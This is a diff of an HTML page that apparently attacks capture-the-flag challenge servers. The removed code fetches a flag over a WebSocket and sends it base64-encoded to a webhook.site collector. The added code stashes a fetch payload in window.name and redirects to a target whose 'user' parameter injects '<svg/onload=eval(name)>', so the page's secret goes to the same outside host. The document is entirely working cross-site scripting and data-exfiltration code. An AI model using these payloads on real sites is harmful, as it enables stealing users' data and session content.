@@ -1,43 +1,13 @@
 <!DOCTYPE html>
 <html>
-<body>
-<script>
-  const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
-
-  let retries = 0;
-
-  function exfiltrate(msg) {
-    const encoded = btoa(msg);
-
-    const i = document.createElement("img");
-    i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + encoded;
-    document.body.appendChild(i);
-
-    ws.send(JSON.stringify({ message: "http://flag." + msg.replace(/\s+/g, '') }));
-  }
-
-  ws.onopen = () => {
-
-    setTimeout(() => {
-      ws.send(JSON.stringify({ message: "/getFlag" }));
-    }, 1000);
-  };
-
-  ws.onmessage = (e) => {
-    try {
-      const msg = JSON.parse(e.data).message;
-
-
-      if (!msg.includes("not authorized")) {
-        exfiltrate(msg);
-      } else if (retries < 3) {
-        retries++;
-        setTimeout(() => {
-          ws.send(JSON.stringify({ message: "/getFlag" }));
-        }, 1000 * retries);
-      }
-    } catch (err) {}
-  };
-</script>
-</body>
+  <body>
+    <script>
+      window.name = `
+        fetch('/readflag')
+          .then(r => r.text())
+          .then(t => location='https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?flag='+btoa(t))
+      `;
+      location = 'http://cat.chummy.tw:29999/?user=%3Csvg/onload=eval(name)%3E';
+    </script>
+  </body>
 </html>
